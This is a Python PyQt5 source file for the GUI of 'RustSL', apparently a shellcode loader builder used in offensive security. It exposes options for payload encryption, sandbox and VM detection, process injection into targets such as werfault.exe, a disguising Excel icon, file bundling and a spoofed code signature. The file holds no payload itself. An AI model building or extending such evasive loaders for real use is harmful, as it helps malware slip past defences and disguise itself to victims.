import os
from PyQt5.QtCore import QSize
from PyQt5.QtWidgets import (
    QWidget, QPushButton, QTextEdit, QLineEdit,
    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox, QComboBox, QFrame
)
from PyQt5.QtGui import QIcon, QMovie

from .widgets import BinComboBox, IcoComboBox, BundleComboBox
from .sign import SignAppComboBox
from .worker import WorkerThread
from .styles import get_main_stylesheet
from .config_manager import load_plugins_manifest, get_default_value, get_encodings
from .ui_components import (
    get_folder_icon,
    create_encryption_combobox,
    create_mem_mode_combobox,
    create_vm_checks_grid,
    create_run_mode_combobox,
    create_target_combobox,
    create_load_payload_combobox
)
class LoaderGUI(QWidget):
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle('RustSL by echQoQ')
        self.setMinimumWidth(650)
        self.setWindowIcon(QIcon(os.path.join('gui', 'icons', 'icon.ico')))
        self.setStyleSheet(get_main_stylesheet())
        self.init_ui()
    
    def log_append(self, text):
        self.log.append(text)
        self.log.ensureCursorVisible()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setSpacing(1)
        folder_icon = get_folder_icon()
        
        layout.addWidget(self._create_bin_and_payload_group(folder_icon))
        
        layout.addWidget(self._create_encryption_group())

        layout.addWidget(self._create_vm_checks_group())
                
        layout.addWidget(self._create_mem_mode_group())
        
        layout.addWidget(self._create_run_mode_group())
        
        layout.addWidget(self._create_icon_group(folder_icon))

        layout.addWidget(self._create_sign_group(folder_icon))
        
        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout.addWidget(self.progress)
        
        layout.addLayout(self._create_bottom_layout())
        
        self.setLayout(layout)
        
        self.loading_movie = QMovie(os.path.join('gui', 'icons', 'loading.gif'))
        self.loading_movie.setScaledSize(QSize(100, 100))
        self.loading_movie.frameChanged.connect(self.update_loading_icon)
        
        # Initial state
        self.on_sign_changed()
        self.on_forgery_changed()
        self._on_load_payload_changed()
    
    def _create_bin_group(self, folder_icon):
        bin_group = QGroupBox('Shellcode')
        bin_layout = QHBoxLayout()
        self.bin_box = BinComboBox()
        bin_btn = QPushButton(folder_icon, '')
        bin_btn.setToolTip('Select shellcode file')
        bin_btn.setFixedWidth(32)
        bin_btn.clicked.connect(lambda: self.bin_box.choose_file(self))
        bin_layout.addWidget(self.bin_box)
        bin_layout.addWidget(bin_btn)
        bin_group.setLayout(bin_layout)
        return bin_group
    
    def _create_bin_and_payload_group(self, folder_icon):
        widget = QWidget()
        layout = QHBoxLayout()
        layout.setContentsMargins(0, 5, 0, 5)
        
        # Shellcode
        bin_group = QGroupBox('Shellcode')
        bin_layout = QHBoxLayout()
        self.bin_box = BinComboBox()
        bin_btn = QPushButton(folder_icon, '')
        bin_btn.setToolTip('Select shellcode file')
        bin_btn.setFixedWidth(32)
        bin_btn.clicked.connect(lambda: self.bin_box.choose_file(self))
        bin_layout.addWidget(self.bin_box)
        bin_layout.addWidget(bin_btn)
        bin_group.setLayout(bin_layout)
        
        # Payload Load
        load_group = QGroupBox('Load')
        load_layout = QVBoxLayout()
        self.load_payload_box = create_load_payload_combobox()
        load_layout.addWidget(self.load_payload_box)
        
        # Default payload address input (only visible when separate loading is selected)
        self.payload_address_input = QLineEdit()
        self.payload_address_input.setText('encrypt.bin')  # Set default value
        self.payload_address_input.setPlaceholderText('Default payload address')
        self.payload_address_input.setVisible(False)  # Hidden by default
        load_layout.addWidget(self.payload_address_input)
        
        load_group.setLayout(load_layout)
        
        # Connect signal
        self.load_payload_box.currentIndexChanged.connect(self._on_load_payload_changed)
        
        layout.addWidget(bin_group)
        layout.addWidget(load_group)
        widget.setLayout(layout)
        return widget
    
    def _create_encryption_group(self):
        enc_group = QGroupBox('Encryption/Decryption')
        enc_layout = QHBoxLayout()
        self.enc_box = create_encryption_combobox()
        self.encode_box = QComboBox()
        encodings = get_encodings()
        for enc in encodings:
            self.encode_box.addItem(enc['label'], enc['id'])
        default_encoding = get_default_value('encoding') or 'base64'
        for i in range(self.encode_box.count()):
            if self.encode_box.itemData(i) == default_encoding:
                self.encode_box.setCurrentIndex(i)
                break
        enc_layout.addWidget(self.enc_box, 8)
        enc_layout.addWidget(self.encode_box, 2)
        enc_group.setLayout(enc_layout)
        return enc_group
    
    def _create_icon_group(self, folder_icon):
        icon_widget = QWidget()
        ico_layout = QHBoxLayout()
        ico_layout.setContentsMargins(0, 0, 0, 0)
        
        # Left: Icon File
        icon_subgroup = QGroupBox('Icon File')
        icon_sub_layout = QHBoxLayout()
        self.ico_box = IcoComboBox()
        ico_btn = QPushButton(folder_icon, '')
        ico_btn.setToolTip('Select icon file')
        ico_btn.setFixedWidth(32)
        ico_btn.clicked.connect(lambda: self.ico_box.choose_file(self))
        icon_sub_layout.addWidget(self.ico_box)
        icon_sub_layout.addWidget(ico_btn)
        icon_subgroup.setLayout(icon_sub_layout)
        
        # Right: File Bundling
        bundle_subgroup = QGroupBox('File Bundling')
        bundle_sub_layout = QHBoxLayout()
        self.forgery_enable_box = QCheckBox('')
        self.forgery_enable_box.stateChanged.connect(self.on_forgery_changed)
        self.bundle_file_box = BundleComboBox()
        self.bundle_file_box.setFixedWidth(200)
        self.bundle_file_box.setEnabled(False)
        self.bundle_choose_btn = QPushButton(folder_icon, '')
        self.bundle_choose_btn.setToolTip('Select bundle file')
        self.bundle_choose_btn.setFixedWidth(32)
        self.bundle_choose_btn.setEnabled(False)
        self.bundle_choose_btn.clicked.connect(self.choose_bundle_file)
        bundle_sub_layout.addWidget(self.bundle_file_box)
        bundle_sub_layout.addWidget(self.bundle_choose_btn)
        bundle_sub_layout.addWidget(self.forgery_enable_box)
        bundle_subgroup.setLayout(bundle_sub_layout)
        
        ico_layout.addWidget(icon_subgroup)
        ico_layout.addWidget(bundle_subgroup)
        icon_widget.setLayout(ico_layout)
        return icon_widget
    
    def _create_load_payload_group(self):
        load_group = QGroupBox('Payload Loading')
        load_layout = QHBoxLayout()
        self.load_payload_box = create_load_payload_combobox()
        load_layout.addWidget(self.load_payload_box)
        load_group.setLayout(load_layout)
        return load_group

    def _create_mem_mode_group(self):
        mem_group = QGroupBox('Memory Allocation')
        mem_layout = QHBoxLayout()
        self.mem_mode_box = create_mem_mode_combobox()
        mem_layout.addWidget(self.mem_mode_box)
        mem_group.setLayout(mem_layout)
        return mem_group
    
    def _create_vm_checks_group(self):
        vm_group = QGroupBox('Sandbox/VM Detection')
        vm_layout = QVBoxLayout()
        self.vm_checks_group = QGroupBox('')
        self.vm_checks_group.setVisible(True)
        grid, self.vm_checkboxes = create_vm_checks_grid()
        self.vm_checks_group.setLayout(grid)
        vm_layout.addWidget(self.vm_checks_group)
        vm_group.setLayout(vm_layout)
        return vm_group
    
    def _create_run_mode_group(self):
        run_group = QGroupBox('Run Mode')
        run_layout = QVBoxLayout()
        self.run_mode_box = create_run_mode_combobox()
        self.run_mode_box.currentIndexChanged.connect(self.on_run_mode_changed)
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Input target program path (e.g., C:/Windows/System32/notepad.exe)")
        self.target_input.setText(r"C:/Windows/System32/werfault.exe")          
        self.target_input.hide()          
        self.pid_input = QLineEdit()
        self.pid_input.setPlaceholderText("Input target process ID (e.g., 1234)")
        self.pid_input.setText("0")          
        self.pid_input.hide()          
        run_layout.addWidget(self.run_mode_box)
        run_layout.addWidget(self.target_input)
        run_layout.addWidget(self.pid_input)
        run_group.setLayout(run_layout)
        return run_group
    
    def _create_sign_group(self, folder_icon):
        sign_widget = QWidget()
        sign_layout = QHBoxLayout()
        sign_layout.setContentsMargins(0, 0, 0, 0)

        # Left: Target Architecture
        target_subgroup = QGroupBox('Target')
        target_sub_layout = QHBoxLayout()
        self.target_box = create_target_combobox()
        self.target_box.setFixedWidth(256)
        target_sub_layout.addWidget(self.target_box)
        target_subgroup.setLayout(target_sub_layout)

        # Right: Spoofed Signature
        sign_subgroup = QGroupBox('Signature')
        sign_sub_layout = QHBoxLayout()
        self.sign_app_box = SignAppComboBox()
        self.sign_app_box.setFixedWidth(200)
        self.sign_choose_btn = QPushButton(folder_icon, '')
        self.sign_choose_btn.setToolTip('Select spoofed application')
        self.sign_choose_btn.setFixedWidth(32)
        self.sign_choose_btn.clicked.connect(lambda: self.sign_app_box.choose_file(self))
        self.sign_enable_box = QCheckBox('')
        self.sign_enable_box.stateChanged.connect(self.on_sign_changed)
        sign_sub_layout.addWidget(self.sign_app_box)
        sign_sub_layout.addWidget(self.sign_choose_btn)
        sign_sub_layout.addWidget(self.sign_enable_box)
        sign_sub_layout.setStretch(1, 1)
        sign_subgroup.setLayout(sign_sub_layout)
    
        sign_layout.addWidget(target_subgroup)
        sign_layout.addWidget(sign_subgroup)
        sign_layout.setStretch(0, 1)
        sign_layout.setStretch(1, 1)
        sign_widget.setLayout(sign_layout)
        return sign_widget
    
    def _create_bottom_layout(self):
        bottom_layout = QHBoxLayout()
        
        log_group = QGroupBox('📋 Log')
        log_layout = QVBoxLayout()
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        log_layout.addWidget(self.log)
        log_group.setLayout(log_layout)
        
        right_layout = QVBoxLayout()
        
        fixed_height = 230
        
        self.win7_checkbox = QCheckBox("Win7 Compatibility")
        self.win7_checkbox.setChecked(False)          
        self.gen_btn = QPushButton(QIcon(os.path.join('gui', 'icons', 'rocket.ico')), '')
        self.gen_btn.setIconSize(QSize(100, 100))
        self.gen_btn.setFixedSize(fixed_height, fixed_height)
        
        right_layout.addWidget(self.win7_checkbox)
        right_layout.addWidget(self.gen_btn)
        
        self.gen_btn.clicked.connect(self.run_all)
        
        bottom_layout.addWidget(log_group)
        bottom_layout.addLayout(right_layout)
        
        return bottom_layout

    def update_loading_icon(self):
        self.gen_btn.setIcon(QIcon(self.loading_movie.currentPixmap()))

    def start_loading_anim(self):
        self.original_icon = self.gen_btn.icon()
        self.loading_movie.start()

    def stop_loading_anim(self):
        self.loading_movie.stop()
        self.gen_btn.setIcon(self.original_icon)

    def run_all(self):
        self.gen_btn.setEnabled(False)
        self.start_loading_anim()
        
        params = self._collect_params()
        
        self.worker = WorkerThread(self, params)
        self.worker.log_signal.connect(self.log_append)
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.done_signal.connect(self.on_gen_done)
        self.worker.error_signal.connect(self.on_gen_error)
        self.worker.start()
    
    def _collect_params(self):
        input_bin = self.bin_box.itemData(self.bin_box.currentIndex())
        if not input_bin:
            input_bin = 'calc.bin'
        
        run_mode = self.run_mode_box.itemData(self.run_mode_box.currentIndex()) or 'enum_ui'
        
        selected_ids = [cb.property('vm_id') for cb in self.vm_checkboxes if cb.isChecked()]
        selected_ids = [sid for sid in selected_ids if isinstance(sid, str) and sid]
        vm_checks = ','.join(selected_ids)
        
        enc_method = self.enc_box.itemData(self.enc_box.currentIndex()) or self.enc_box.currentText()
        
        encode_method = self.encode_box.currentData() or self.encode_box.currentText()
        
        icon_path = self.ico_box.itemData(self.ico_box.currentIndex())
        if not icon_path:
            icon_path = os.path.join('icons', 'excel.ico')
        
        sign_enable = self.sign_enable_box.isChecked()
        sign_app = self.sign_app_box.itemData(self.sign_app_box.currentIndex())
        forgery_enable = self.forgery_enable_box.isChecked()
        bundle_file = self.bundle_file_box.itemData(self.bundle_file_box.currentIndex()) if forgery_enable else ""
        
        mem_mode = self.mem_mode_box.itemData(self.mem_mode_box.currentIndex())
        if not mem_mode:
            mem_mode = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
        
        load_payload_mode = self.load_payload_box.itemData(self.load_payload_box.currentIndex())
        if not load_payload_mode:
            load_payload_mode = get_default_value('load_payload_mode') or 'read_from_self'

        default_payload_address = self.payload_address_input.text().strip() if self.payload_address_input.isVisible() else ""

        target = self.target_box.itemData(self.target_box.currentIndex())
        if not target:
            target = self.target_box.currentText()
        
        target_program = self.target_input.text().strip() if self.target_input.isVisible() else ""
        
        target_pid = self.pid_input.text().strip() if self.pid_input.isVisible() else "0"
        
        return {
            'input_bin': input_bin,
            'run_mode': run_mode,
            'vm_checks': vm_checks,
            'enc_method': enc_method,
            'encode_method': encode_method,
            'icon_path': icon_path,
            'sign_enable': sign_enable,
            'sign_app': sign_app,
            'forgery_enable': forgery_enable,
            'bundle_file': bundle_file,
            'mem_mode': mem_mode,
            'load_payload_mode': load_payload_mode,
            'default_payload_address': default_payload_address,
            'target': target,
            'target_program': target_program,
            'target_pid': target_pid,
            'win7_compat': self.win7_checkbox.isChecked()
        }
    
    def on_gen_error(self, msg):
        self.stop_loading_anim()
        self.gen_btn.setEnabled(True)
        self.progress.setValue(0)
        self.log_append('[Error] ' + msg)
        QMessageBox.critical(self, 'Error', msg)

    def on_forgery_changed(self):
        enabled = self.forgery_enable_box.isChecked()
        self.bundle_file_box.setEnabled(enabled)
        self.bundle_choose_btn.setEnabled(enabled)

    def on_sign_changed(self):
        enabled = self.sign_enable_box.isChecked()
        self.sign_app_box.setEnabled(enabled)
        self.sign_choose_btn.setEnabled(enabled)

    def choose_bundle_file(self):
        from PyQt5.QtWidgets import QFileDialog
        from PyQt5.QtGui import QIcon
        import os
        path, _ = QFileDialog.getOpenFileName(self, 'Select bundle file', '', 'All Files (*)')
        if path:
            # Ensure absolute path
            path = os.path.abspath(path)
            display_name = os.path.basename(path)
            bundle_icon = QIcon(os.path.join('gui', 'icons', 'bundle.ico')) if os.path.exists(os.path.join('gui', 'icons', 'bundle.ico')) else QIcon()
            # Check if already exists
            for i in range(self.bundle_file_box.count()):
                if self.bundle_file_box.itemData(i) == path:
                    self.bundle_file_box.setCurrentIndex(i)
                    return
            # Add new item
            self.bundle_file_box.addItem(bundle_icon, display_name, path)
            self.bundle_file_box.setCurrentIndex(self.bundle_file_box.count() - 1)

    def on_run_mode_changed(self):
        manifest = load_plugins_manifest()
        run_modes = manifest.get('run_modes', [])
        run_mode_id = self.run_mode_box.itemData(self.run_mode_box.currentIndex())
        for rm in run_modes:
            if rm['id'] == run_mode_id:
                pattern = rm.get('pattern', 1)
                if pattern == 2:
                    self.target_input.show()
                    self.pid_input.hide()
                elif pattern == 3:
                    self.target_input.hide()
                    self.pid_input.show()
                else:
                    self.target_input.hide()
                    self.pid_input.hide()
                break

    def on_gen_done(self, dst_file):
        self.stop_loading_anim()
        self.progress.setValue(100)
        self.gen_btn.setEnabled(True)
        QMessageBox.information(self, 'Done', f'Successfully generated: {dst_file}')

    def _on_load_payload_changed(self):
        """Handle payload loading method change"""
        current_load_mode = self.load_payload_box.currentData()
        if current_load_mode == 'cmdline':
            self.payload_address_input.show()
            # If the input box is empty, set the default value
            if not self.payload_address_input.text().strip():
                self.payload_address_input.setText('encrypt.bin')
        else:
            self.payload_address_input.hide()